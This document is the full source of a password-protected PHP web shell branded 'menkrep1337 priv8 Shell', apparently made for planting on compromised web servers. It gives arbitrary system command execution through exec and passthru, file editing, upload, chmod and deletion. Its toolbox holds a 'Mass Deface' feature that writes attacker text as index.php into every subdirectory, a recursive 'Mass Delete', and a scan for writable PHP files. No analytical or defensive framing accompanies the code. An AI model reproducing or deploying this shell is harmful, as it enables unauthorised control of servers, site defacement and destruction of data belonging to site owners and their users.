<?php
session_start();
@set_time_limit(0);
@clearstatcache();
/////////////// 
$folder = "data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=";
$file = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=";
////////////////
function uni_exec($s){
	if(function_exists("exec")){
			$buff = "";
			@exec($s, $r);
			foreach($r as $r){
				$buff .= $r."<br>";
			}
			return $buff;
	}
	else if(function_exists("passthru")){
		@ob_start();
		@passthru($s);
		$str = @ob_get_contents();
		@ob_end_clean();
		return $str;
	}
	else if(function_exists("system")){
		@ob_start();
		@passthru($s);
		$str = @ob_get_contents();
		@ob_end_clean();
		return $str;
	}
	else return "<red>Unable to execute command</red>";
}
function uni_subdir($s, $flags = 0){
	$f = glob($s, $flags);
	foreach(glob(dirname($s)."/*", $flags) as $g){
		$f = array_merge($f, uni_subdir($g."/".basename($s), $flags));
	}
	return $f;
}
function uni_size($s)
{
 $type = array("", "KB", "MB", "GB", "TB", "PB", );
 $index = 0;
 while( $s >= 1024 ){
 	 $s /= 1024;
 	 $index++;
 }
 return sprintf("%1.2f",$s).$type[$index];
}
function uni_perm($s)
{
	return array(
		is_writable($s) ? "<green>Write</green>":"<red>Write</red>",
		is_readable($s) ? "<green>Read</green>":"<red>Read</red>",
		is_executable($s) ? "<green>Exec</green>":"<red>Exec</red>"
	);
}
?>
<title>
	@menkrep1337 priv8 Shell
</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<?php
$password = "menkrep1337";
if(isset($_POST["password"]) && $_POST["password"] == $password && empty($_SESSION["id"])){
	$_SESSION["id"] = $password;
}
?>
<link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
<style>
	* {
		font-family: "Raleway";
		color: white;
	}
	red {
		color: red;
	}
	green {
		color: green;
	}
	table, th, tr {
		border: 1px solid #91FF00;
		border-collapse: collapse;
		font-size: 90%;
		padding: 7px;
		text-align: left;
		overflow: auto;
	}
	a {
		text-decoration: none;
	}
	#small-dotted {
		border: 1px dotted green;
		padding: 5px;
		margin: 5px;
		width: 40%;
		background: #38B344;
		text-align: center;
		display: inline-block;
	}
	#banner {
		border: 1px dotted yellow;
		padding: 10px;
		margin: 10px;
	}
	textarea {
		resize: none;
		border: none;
		border-radius: 10px;
		color: black;
		width: 90%;
		height: 50%;
	}
	#small-solid {
		border: 1px solid cyan;
		padding: 10px;
		margin: 10px;
	}
	#input {
		border: none;
		background: white;
		padding: 10px;
		margin: 10px;
		display: inline-block;
		border-radius: 10px;
		color: black;
	}
	#button {
		border: none;
		background: #0AC120;
		padding: 10px;
		margin: 5px;8
		display: inline-block;
	}
	#panel {
		border: none;
		background: black;
		padding: 10px;
		margin: 5px;
		width: 45%;
		display: inline-block;
	}
</style>
<link rel="icon" href="https://i.imgrpost.com/imgr/2019/07/10/download.png"> 
<body bgcolor="black">
<div id="banner">
	<center>
		<b>menkrep1337 priv8 shell</b><br>
		<a href="?">[ HOME ]</a> <a href="?do=logout">[ LOGOUT ]</a>
		<a href="?dir=<?php echo isset($_GET['dir']) ? dirname($_GET['dir']) : (isset($_GET['src']) ? dirname($_GET['src']) : getcwd()); ?>">[ BACK ]</a>
	</center>
</div>
<?php
////////////////
if(isset($_GET["do"]) && isset($_SESSION["id"])){
	switch($_GET["do"]){
		case "edit":
			if(isset($_POST["content"]) && isset($_GET["src"])){ 
				$p = @file_put_contents($_GET["src"], stripslashes($_POST["content"]));
				echo ($p) ? "<green>Success</green>":"<red>Failed</red>";
				die("<center><a href='?'>Back</a></center>");
			}
			$p = @file_get_contents(realpath($_GET["src"]));
			if($p) echo "
			
<center>
<form method='POST' action='?do=edit&src=".$_GET["src"]."'>
	<green>File: ".realpath($_GET["src"])." </green>
	<textarea name='content'>".htmlspecialchars($p)."</textarea>
<button id='button' style='width: 50%;'>Save</button>
</center>
";
			else echo "
<center>
	<red>Cant open file..</red>
</center>
";
			die();
			break;
		///
		case "rename":
		if(isset($_POST["content"]) && isset($_GET["src"])){
			$p = @rename(realpath($_GET["src"]), $_POST["content"]);
			echo ($p) ? "<green>Success</green>":"<red>Failed</red>";
			die("<center><a href='?'>Back</a></center>");
		}
		echo "
<center>
	<form method='POST' action='?do=rename&src=".$_GET["src"]."'>
		<input id='input' name='content' placeholder='".realpath($_GET["src"])."' value='".realpath($_GET["src"])."'>
		<button id='button'>Rename</button>
	</form>
</center>		
";
		die();
		break;
	
	////
	case "newfile":
		if(@file_put_contents(realpath($_GET["src"])."/newfile.php", " ")) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////
	case "mkdir":
		if(mkdir(realpath($_GET["src"])."/newfolder")) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////  
	case "unlink":
		if(@unlink(realpath($_GET["src"]))) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////
	case "rmdir":
		if(@rmdir(realpath($_GET["src"]))) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////
	case "chmod":
		if(isset($_GET["src"]) and isset($_POST["content"])){
		 	$p = @chmod(realpath($_GET["src"]), $_POST["content"]);
			echo ($p) ? "<green>Success</green>":"<red>Failed</red>";
			die("<center><a href='?'>Back</a></center>");
		}
		echo "
<center>
	<form method='POST' action='?do=chmod&src=".$_GET["src"]."'>
		<input id='input' name='content' placeholder='".fileperms(realpath($_GET["src"]))."' value='".fileperms(realpath($_GET["src"]))."'>
		<button id='button'>Chmod</button>
	</form>
</center>				
";
	die();
	break;
	/////
	case "logout":
		unset($_SESSION["id"]);
		session_destroy();
		break;
	case "copy":
		if(copy(realpath($_GET["src"]), realpath($_GET["src"]).mt_rand())) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////
	case "upload":
		if(move_uploaded_file($_FILES["qqfile"]["tmp_name"], realpath($_GET["dir"])."/".$_FILES["qqfile"]["name"])) echo "<green>Success</green>";
		else echo "<red>Failed</red>";
		echo "<br>";
		break;
	////
	case "properties":
		if(@stat(realpath($_GET["src"]))) {
			echo "<green>Success</green><hr>";
			foreach( array_slice(stat(realpath($_GET["src"])), 13) as $name=>$stat){
				$stat = ($name == "atime") ? date("F d Y H:i:s.", $stat) : $stat;
				$stat = ($name == "mtime") ? date("F d Y H:i:s.", $stat) : $stat;
				$stat = ($name == "ctime") ? date("F d Y H:i:s.", $stat) : $stat;
				$stat = ($name == "size") ? uni_size($stat) : $stat;
				echo $name.": <green>".$stat."</green><hr>";
			} 
		}
		else echo "<red>Failed</red>";
		echo "<br>";
		die();
		break;
	////////////
	case "mass_deface":
		if(isset($_POST["text"]) && isset($_POST["name"]) && isset($_GET["src"])){
			$pt = realpath($_GET["src"]);
			$text = $_POST["text"];
			$name = $_POST["name"];
			$dd = uni_subdir("$pt/*", GLOB_ONLYDIR|GLOB_NOSORT);
			foreach($dd as $ddr){
				if(@file_put_contents($ddr."/".$name, $text))
					echo "<green>$ddr/$name</green><br>";
				else 
					echo "<red>$ddr/$name</red><br>";
			}
  	}
		echo "
<form method='POST' action='?do=mass_deface&src=".$_GET["src"]."'>
	<center>
	<input id='input' name='name' value='index.php' placeholder='name'><hr>
	<textarea placeholder='text' name='text'></textarea><hr>
	<button id='button' style='width: 50%'>Tusbol</button>
	</center>
</form>
";
		die();
		break;
	///
	case "mass_delete":
		if(isset($_POST["name"]) && isset($_GET["src"])){
			$pt = realpath($_GET["src"]);
			$name = $_POST["name"];
			$dd = uni_subdir("$pt/$name", GLOB_NOSORT);
			foreach($dd as $ddr){
				if(@unlink($ddr,$text))
					echo "<green>$ddr</green><br>";
				else
					echo "<red>$ddr</red><br>";
				}
  	}
		echo "
<form method='POST' action='?do=mass_delete&src=".$_GET["src"]."'>
	<center>
	<input id='input' name='name' value='index.php' placeholder='name'><hr>
	<button id='button' style='width: 50%'>Tusbol</button>
	</center>
</form>
";
		die();
		break;
		//////
	case "writable":
	 if(isset($_GET["src"]) && isset($_POST["name"])){
	 		$pt = realpath($_GET["src"]);
			$name = $_POST["name"];
			$dd = uni_subdir("$pt/$name");
			foreach($dd as $ddr){
				if(is_writable($ddr))
					echo "<green>$ddr</green><br>";
			}
			
	 }
	 echo "
<form method='POST' action='?do=writable&src=".$_GET["src"]."'>
	<center>
	<input id='input' name='name' value='*.php' placeholder='Regex'><hr>
	<button id='button' style='width: 50%'>Tusbol</button>
	</center>
</form>
";
  die();
  break;
	}
}
//////////////
?>
	<?php
	if(!isset($_SESSION["id"])):
	?>
	<form method="POST" action="">
		<input name="password" id="input" placeholder="password" style="width: 60%;">
		<button id="button" style="width: 30%">Login</button>
	</form>
	<?php
	die();
	else:
	$dir = isset($_GET["dir"]) ? $_GET["dir"] : getcwd();
	?>
	System:
	<div id="small-solid">
			<font style="color: #0CEB9A;"><?php echo php_uname(); ?></font>
	</div>
	Others:
	<div id="small-solid">
		My IP: <font style="color: #0CEB9A;"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font><br>
		Server IP: <font style="color: #0CEB9A;"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></font><br>
   Free:  <font style="color: #0CEB9A;"><?php echo uni_size(disk_free_space(".")); ?></font><br>
   User:  <font style="color: #0CEB9A;"><?php echo get_current_user(); ?></font><br>
   PYTHON: <?php echo (uni_exec("python --help")) ? "<green>ON</green>":"<red>OFF</red>"?>
 		PERL: <?php echo (uni_exec("perl --help")) ? "<green>ON</green>":"<red>OFF</red>"?>
		WGET: <?php echo (uni_exec("wget --help")) ? "<green>ON</green>":"<red>OFF</red>"?>
		CURL: <?php echo (uni_exec("curl --help")) ? "<green>ON</green>":"<red>OFF</red>"?>

  </div>
  <div id="small-solid">
		<form method="POST" action="?do=upload&dir=<?php echo $dir; ?>" enctype="multipart/form-data">
			<input type="file" name="qqfile">
				<input type="submit" id="button" value="upload">
		</form>
	</div>
	Toolbox:
	<div id="small-solid" style="text-align: center;">
		<div id="small-dotted">
			<a href="?do=mass_deface&src=<?php echo $dir; ?>">Mass Deface</a>
		</div>
		<div id="small-dotted">
			<a href="?do=mass_delete&src=<?php echo $dir?>">Mass Delete</a>
		</div>
		<div id="small-dotted">
			<a href="?do=writable&src=<?php echo $dir?>">Writable</a>
		</div>

	</div>
	<table style="width: 100%;">
		<tr> 
			<th>Name</th>
			<th>Permission</th>
			<th>Action</th>
		</tr>
	<?php
	$hb = "";
	$nb = "";
	$hit = "";
	foreach(explode("/",realpath($dir)) as $vb){
			$hb .= $vb."/";
			$nb = $vb;
			$hit .= "<a href='?dir=$hb'>$nb/</a>";
		}
	echo "Path: $hit";
	echo "<br>
<form method='POST' action='?do=cmd&dir=$dir'>
	menkrep1337.~$<input id='input' name='cmd' placeholder='command'>
</form>
	";
	echo isset($_POST["cmd"]) ? uni_exec($_POST["cmd"]) : "";
	if(!@scandir($dir)){
		die("<red>permmission denied</red>");
	}
	foreach( scandir($dir) as $item){	 	
	$perm = uni_perm($dir."/".$item); 
		if($item == "." OR $item == ".."){
			$ite = "<a href='?dir=$dir/$item'>$item</a>";
			echo "
				<tr>
					<th><img src='$folder'>$ite</th>
					<th>$perm[0] - $perm[1] - $perm[2]</th>
					<th>
						<a href='?do=newfile&src=$dir/$item&dir=$dir'>New File</a>
						<a href='?do=mkdir&src=$dir/$item&dir=$dir'>New Folder</a>
					</th>
				</tr>
			";
			continue;
		}
		if(is_dir($dir."/".$item)){
			$ite = "<a href='?dir=$dir/$item'>$item</a>";
			echo "
				<tr>
					<th><img src='$folder'>$ite</th>
					<th>$perm[0] - $perm[1] - $perm[2]</th>
					<th>
						<a href='?do=rename&src=$dir/$item&dir=$dir'>Rename</a>
						<a href='?do=rmdir&src=$dir/$item&dir=$dir'>Delete</a>
						<a href='?do=chmod&src=$dir/$item&dir=$dir'>Chmod</a>
						<a href='?do=properties&src=$dir/$item&dir=$dir'>Info</a>

					</th>
				</tr>
			";
		}
	}
	foreach( scandir($dir) as $item){	 	
	$perm = uni_perm($dir."/".$item); 
		if(is_file($dir."/".$item)){
			$ite = "<a href='?do=edit&src=$dir/$item'>$item</a>";
			echo "
				<tr>
					<th><img src='$file'>$ite</th>
					<th>$perm[0] - $perm[1] - $perm[2]</th>
					<th>
							<a href='?do=rename&src=$dir/$item&dir=$dir'>Rename</a>
							<a href='?do=unlink&src=$dir/$item&dir=$dir'>Delete</a>
							<a href='?do=chmod&src=$dir/$item&dir=$dir'>Chmod</a>
							<a href='?do=copy&src=$dir/$item&dir=$dir'>Copy</a>
							<a href='?do=properties&src=$dir/$item&dir=$dir'>Info</a>

					</th>
				</tr>
			";
		}
	}
	
	?>
	</table>
	<?php
	endif;
	?>
</body>